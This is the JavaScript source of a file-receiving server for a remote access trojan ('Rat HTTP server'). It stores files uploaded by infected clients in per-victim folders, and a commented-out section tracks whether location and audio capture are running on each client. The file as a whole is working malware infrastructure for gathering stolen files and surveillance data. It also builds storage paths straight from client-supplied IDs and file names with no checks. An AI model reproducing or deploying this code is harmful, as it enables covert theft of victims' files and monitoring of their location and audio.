/*
 * Rat HTTP server
 */

var express = require('express');
var path = require('path');
var mongoose = require('mongoose');
var morgan = require('morgan');
var multer = require('multer');
var mkdirp = require('mkdirp');
var fs     = require('fs');

// The directory where each client dir is saved
var controlServerDirectory = '/../';
// The directory name inside the client dir
var clientFileDirectoryName = 'media';
// The max file size to accept from a client in bytes
var maxFileSize = 10 * 1024 * 1024;

var storage = multer.diskStorage({
    destination: function(req, file, callback) {
        // For use with the java rat server we... located in the parent directory
        // Thus we use /../ and save in the client id's directory
        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
        // Ensure dir exists, it probabaly already exists when using java rat server
        mkdirp.sync(directory);
        callback(null, directory);
    },
    filename: function(req, file, callback) {
        // Save the file with the name it had on the client side
        callback(null, file.originalname);
    }
});
var upload = multer({
    storage: storage,
    limits: {
        // Filesize in bytes
        fileSize: maxFileSize
    },
    fileFilter: (req, file, callback) => {
        // Get file info from client
        var fileName = file.originalname;
        // Get our working directory
        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
        // Check if the file already exists
        fileExists(directory, fileName, (exists) => {
            if(exists){
                // File already exists, do not accept this upload
                var error = req.params.clientId + ' ' + fileName + ' exists ';
                callback(error, false);
            } else {
                // File does not exist, accept it
                console.log('%s Receiving: %s', req.params.clientId, fileName);
                callback(null, true);
            }
        });
    }
    // The file identifier expected for the client, these must match
}).single('tehAwesomeFile');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// Simple connection logger
// app.use(morgan(':date[clf] :remote-addr :url'));

/*
 * A client is uploading a file
 */
app.post('/postFile/:clientId', (req, res) => {
    upload(req, res, (err) => {
        if (err) {
            console.log(err);
            res.status(500).send(err);
        } else {
            res.status(200).send(req.file.originalname);
        }
    });
});

app.get('/acceptFile/:clientId', (req, res) => {
    var fileName = req.query.fileName;
    var fileSize = req.query.fileSize;
    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientFileDirectoryName);
    fileExists(directory, fileName, (exists) => {
        if(exists){
            res.status(500).send(fileName + ' Already exists on server');
        } else if (fileSize > maxFileSize){
            res.status(500).send(fileName + ' Too large');
        } else {
            res.status(200).send();
        }
    });
});

/*
 * // Receive status and respond with actions to take on the client
 * app.get('/status/:clientId', (req, res) => {
 *     var clientId          = req.params.clientId;
 *     var isLocationStarted = req.query.isLocationStarted;
 *     var isAudioStarted    = req.query.isAudioStarted;
 *
 *     connectionManager.addUpdate(clientId, isLocationStarted, isAudioStarted);
 *     res.send(connectionManager.getLastById(clientId));
 * });
 *
 * app.get('/connections', (req, res) => {
 *     res.send(connectionManager.connections);
 * });
 *
 * function Connection(clientId, isLocationStarted, isAudioStarted) {
 *     this.clientId          = clientId;
 *     this.age               = new Date().getTime();
 *     this.isAudioStarted    = isLocationStarted;
 *     this.isLocationStarted = isAudioStarted;
 * }
 *
 * var connectionManager = {
 *     connections: [],
 *     addUpdate: function(clientId, isLocationStarted, isAudioStarted) {
 *         // Check if connection exists
 *         if (this.getLastById(clientId) === undefined) {
 *             this.connections.push(new Connection(clientId, isLocationStarted, isAudioStarted));
 *         } else {
 *             this.getLastById(clientId).age = new Date().getTime();
 *             this.getLastById(clientId).isLocationStarted = isLocationStarted;
 *             this.getLastById(clientId).isAudioStarted = isAudioStarted;
 *         }
 *         // Remove dead connections
 *         this.clean();
 *     },
 *     clean: function() {
 *         var timeout = 60000;
 *         for (var i = 0; i < this.connections.length; i++) {
 *             var count = 0;
 *             if (this.connections[i].age < (new Date().getTime() - timeout)) {
 *                 var index = this.connections.indexOf(this.connections[i]);
 *                 this.connections.splice(index, 1);
 *                 count++;
 *             }
 *         }
 *     },
 *     getLastById: function(clientId) {
 *         for (var i = this.connections.length - 1; i >= 0; i--) {
 *             if (this.connections[i].clientId === clientId) {
 *                 return this.connections[i];
 *             }
 *         }
 *     }
 * };
 */

function fileExists(dir, fileName, callback) {
    fs.stat(path.join(dir, fileName), (err, stats) => {
        if (err === null) {
            callback(true);
        } else if (err.code === 'ENOENT') {
            callback(false);
        } else {
            console.log(err.code);
            callback(false);
        }
    });
}



// start the server
var server = app.listen(PORT_NUMBER, function() {
    var host = server.address().address;
    var port = server.address().port;

    console.log('listening at %s:%s', host, port);
});
